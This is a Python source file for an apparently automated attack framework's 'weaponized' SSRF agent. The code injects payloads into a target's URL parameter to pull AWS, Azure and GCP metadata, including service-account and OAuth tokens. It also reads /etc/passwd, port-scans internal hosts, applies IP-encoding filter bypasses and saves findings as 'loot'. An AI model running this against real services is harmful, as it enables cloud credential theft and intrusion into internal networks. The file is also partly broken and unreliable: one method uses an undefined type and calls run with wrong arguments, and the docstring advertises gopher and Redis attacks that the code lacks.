"""
Weaponized SSRF (Server-Side Request Forgery) Agent
โจมตีช่องโหว่ SSRF เพื่อเข้าถึงทรัพยากรภายในและ bypass security controls
"""

import asyncio
import hashlib
import os
import re
from typing import Dict, List, Any
from urllib.parse import urlparse, urljoin

import aiohttp

from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log


class SSRFAgent(BaseAgent):
    """
    Weaponized SSRF Agent
    
    Features:
    - Internal network scanning (localhost, 192.168.x.x, 10.x.x.x, 172.16-31.x.x)
    - Cloud metadata exploitation (AWS, Azure, GCP)
    - Protocol smuggling (file://, gopher://, dict://)
    - URL bypass techniques (@ symbol, IP encoding, DNS rebinding)
    - Port scanning via SSRF
    - File reading via file:// protocol
    - Redis/Memcached exploitation via gopher://
    """
    
    supported_phases = [AttackPhase.INITIAL_FOOTHOLD, AttackPhase.EXPLOITATION]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        workspace_dir = os.getenv("WORKSPACE_DIR", "workspace"); self.results_dir = os.path.join(workspace_dir, "loot", "ssrf")
        os.makedirs(self.results_dir, exist_ok=True)
        
        # Cloud metadata URLs
        self.cloud_metadata = {
            "aws": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/latest/dynamic/instance-identity/document"
            ],
            "azure": [
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
            ],
            "gcp": [
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
            ]
        }
        
        # Internal targets
        self.internal_targets = [
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://[::1]",
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1"
        ]
        
        # Common ports
        self.common_ports = [
            80, 443, 8080, 8443, 3000, 5000, 8000, 8888,
            22, 21, 23, 25, 3306, 5432, 6379, 27017, 9200
        ]
        
        # Bypass techniques
        self.bypass_techniques = [
            lambda url: url,  # Original
            lambda url: url.replace("http://", "http://0x7f.0.0.1@"),  # @ bypass
            lambda url: url.replace("127.0.0.1", "127.1"),  # Shortened IP
            lambda url: url.replace("127.0.0.1", "2130706433"),  # Decimal IP
            lambda url: url.replace("127.0.0.1", "0x7f000001"),  # Hex IP
            lambda url: url.replace("http://", "http://127.0.0.1@"),  # @ with localhost
        ]

    async def run(self, directive: str, context: Dict[str, Any]) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "scan", "exploit", "cloud", "internal"
            context: {
                "url": target URL with SSRF parameter,
                "parameter": parameter name to inject,
                "method": "GET" or "POST",
                "data": POST data (if method is POST)
            }
        """
        log.info(f"[SSRFAgent] Starting with directive: {directive}")
        
        url = context.get("url")
        if not url:
            return AgentData(
                agent_name="SSRFAgent",
                success=False,
                data={"error": "No URL provided"}
            )

        try:
            if directive == "scan":
                result = await self._scan_for_ssrf(url, context)
            elif directive == "exploit":
                result = await self._exploit_ssrf(url, context)
            elif directive == "cloud":
                result = await self._exploit_cloud_metadata(url, context)
            elif directive == "internal":
                result = await self._scan_internal_network(url, context)
            else:
                result = await self._scan_for_ssrf(url, context)
            
            return AgentData(
                agent_name="SSRFAgent",
                success=result.get("success", False),
                data=result
            )
            
        except Exception as e:
            log.error(f"[SSRFAgent] Error: {e}")
            return AgentData(
                agent_name="SSRFAgent",
                success=False,
                data={"error": str(e)}
            )

    async def _scan_for_ssrf(self, url: str, context: Dict) -> Dict:
        """สแกนหา SSRF vulnerabilities"""
        log.info(f"[SSRFAgent] Scanning {url} for SSRF...")
        
        vulnerabilities = []
        parameter = context.get("parameter", "url")
        method = context.get("method", "GET")
        
        # Test with localhost
        test_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/"
        ]
        
        for payload in test_payloads:
            is_vulnerable = await self._test_ssrf_payload(url, parameter, payload, method, context)
            
            if is_vulnerable:
                vulnerabilities.append({
                    "parameter": parameter,
                    "payload": payload,
                    "method": method
                })
                log.success(f"[SSRFAgent] SSRF found with payload: {payload}")
        
        result = {
            "success": len(vulnerabilities) > 0,
            "url": url,
            "vulnerabilities": vulnerabilities,
            "output_file": self._save_results(url, "scan", vulnerabilities)
        }
        
        if vulnerabilities:
            log.success(f"[SSRFAgent] Found {len(vulnerabilities)} SSRF vulnerabilities!")
        else:
            log.warning("[SSRFAgent] No SSRF vulnerabilities found")
        
        return result

    async def _test_ssrf_payload(self, url: str, parameter: str, payload: str, method: str, context: Dict) -> bool:
        """ทดสอบ SSRF payload"""
        try:
            headers = context.get("headers", {})
            headers["User-Agent"] = "Mozilla/5.0"
            
            async with aiohttp.ClientSession() as session:
                if method.upper() == "GET":
                    test_url = f"{url}?{parameter}={payload}"
                    async with session.get(test_url, headers=headers, timeout=10) as response:
                        content = await response.text()
                        
                        # Check for SSRF indicators
                        if self._check_ssrf_indicators(content, payload):
                            return True
                
                elif method.upper() == "POST":
                    data = context.get("data", {})
                    data[parameter] = payload
                    async with session.post(url, data=data, headers=headers, timeout=10) as response:
                        content = await response.text()
                        
                        if self._check_ssrf_indicators(content, payload):
                            return True
            
            return False
            
        except Exception as e:
            log.debug(f"[SSRFAgent] Error testing payload: {e}")
            return False

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute ssrf agent weaponized"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _check_ssrf_indicators(self, content: str, payload: str) -> bool:
        """ตรวจสอบ indicators ของ SSRF"""
        indicators = [
            "root:x:0:0",  # /etc/passwd
            "ami-id",  # AWS metadata
            "instance-id",
            "hostname",
            "local-ipv4",
            "public-keys",
            "security-credentials",
            "computeMetadata",  # GCP
            "metadata.google.internal"
        ]
        
        content_lower = content.lower()
        
        for indicator in indicators:
            if indicator.lower() in content_lower:
                return True
        
        # Check if we got internal network response
        if "localhost" in payload or "127.0.0.1" in payload:
            if len(content) > 100 and "connection refused" not in content_lower:
                return True
        
        return False

    async def _exploit_ssrf(self, url: str, context: Dict) -> Dict:
        """Exploit SSRF vulnerability"""
        log.info(f"[SSRFAgent] Exploiting SSRF...")
        
        # First scan
        scan_result = await self._scan_for_ssrf(url, context)
        
        if not scan_result.get("success"):
            return {
                "success": False,
                "message": "No SSRF vulnerability found"
            }
        
        # Try to exploit
        exploited_data = []
        
        # Try cloud metadata
        cloud_data = await self._exploit_cloud_metadata(url, context)
        if cloud_data.get("success"):
            exploited_data.append(cloud_data)
        
        # Try internal network
        internal_data = await self._scan_internal_network(url, context)
        if internal_data.get("success"):
            exploited_data.append(internal_data)
        
        result = {
            "success": len(exploited_data) > 0,
            "vulnerabilities": scan_result["vulnerabilities"],
            "exploited_data": exploited_data,
            "output_file": self._save_results(url, "exploit", exploited_data)
        }
        
        log.success(f"[SSRFAgent] Exploitation complete!")
        return result

    async def _exploit_cloud_metadata(self, url: str, context: Dict) -> Dict:
        """Exploit cloud metadata endpoints"""
        log.info(f"[SSRFAgent] Exploiting cloud metadata...")
        
        parameter = context.get("parameter", "url")
        method = context.get("method", "GET")
        
        found_metadata = []
        
        for cloud_provider, endpoints in self.cloud_metadata.items():
            log.info(f"[SSRFAgent] Testing {cloud_provider} metadata...")
            
            for endpoint in endpoints:
                try:
                    headers = context.get("headers", {})
                    headers["User-Agent"] = "Mozilla/5.0"
                    
                    # Add cloud-specific headers
                    if cloud_provider == "azure":
                        headers["Metadata"] = "true"
                    elif cloud_provider == "gcp":
                        headers["Metadata-Flavor"] = "Google"
                    
                    async with aiohttp.ClientSession() as session:
                        if method.upper() == "GET":
                            test_url = f"{url}?{parameter}={endpoint}"
                            async with session.get(test_url, headers=headers, timeout=10) as response:
                                if response.status == 200:
                                    content = await response.text()
                                    
                                    if len(content) > 0 and "error" not in content.lower():
                                        found_metadata.append({
                                            "provider": cloud_provider,
                                            "endpoint": endpoint,
                                            "data": content[:500]  # First 500 chars
                                        })
                                        log.success(f"[SSRFAgent] Found {cloud_provider} metadata!")
                    
                    await asyncio.sleep(0.2)
                    
                except Exception as e:
                    log.debug(f"[SSRFAgent] Error testing {endpoint}: {e}")
        
        result = {
            "success": len(found_metadata) > 0,
            "metadata": found_metadata,
            "output_file": self._save_results(url, "cloud_metadata", found_metadata)
        }
        
        if found_metadata:
            log.success(f"[SSRFAgent] Found {len(found_metadata)} cloud metadata endpoints!")
        
        return result

    async def _scan_internal_network(self, url: str, context: Dict) -> Dict:
        """สแกน internal network"""
        log.info(f"[SSRFAgent] Scanning internal network...")
        
        parameter = context.get("parameter", "url")
        method = context.get("method", "GET")
        
        found_hosts = []
        
        # Test common internal IPs
        for target in self.internal_targets:
            for port in self.common_ports[:5]:  # Test first 5 ports
                test_target = f"{target}:{port}"
                
                is_alive = await self._test_internal_host(url, parameter, test_target, method, context)
                
                if is_alive:
                    found_hosts.append({
                        "host": target,
                        "port": port,
                        "status": "alive"
                    })
                    log.success(f"[SSRFAgent] Found internal host: {test_target}")
                
                await asyncio.sleep(0.1)
        
        result = {
            "success": len(found_hosts) > 0,
            "hosts": found_hosts,
            "output_file": self._save_results(url, "internal_scan", found_hosts)
        }
        
        if found_hosts:
            log.success(f"[SSRFAgent] Found {len(found_hosts)} internal hosts!")
        
        return result

    async def _test_internal_host(self, url: str, parameter: str, target: str, method: str, context: Dict) -> bool:
        """ทดสอบ internal host"""
        try:
            headers = context.get("headers", {})
            headers["User-Agent"] = "Mozilla/5.0"
            
            async with aiohttp.ClientSession() as session:
                if method.upper() == "GET":
                    test_url = f"{url}?{parameter}={target}"
                    async with session.get(test_url, headers=headers, timeout=5) as response:
                        content = await response.text()
                        
                        # Check if we got a response (not connection refused)
                        if len(content) > 0 and "connection refused" not in content.lower():
                            return True
            
            return False
            
        except Exception as e:
            return False

    def _save_results(self, url: str, operation: str, data: Any) -> str:
        """บันทึกผลลัพธ์"""
        url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
        filename = f"ssrf_{operation}_{url_hash}.txt"
        filepath = os.path.join(self.results_dir, filename)
        
        try:
            import json
            with open(filepath, 'w') as f:
                f.write(f"URL: {url}\n")
                f.write(f"Operation: {operation}\n")
                f.write("="*80 + "\n\n")
                f.write(json.dumps(data, indent=2))
            return filepath
        except Exception as e:
            log.error(f"[SSRFAgent] Failed to save results: {e}")
            return ""

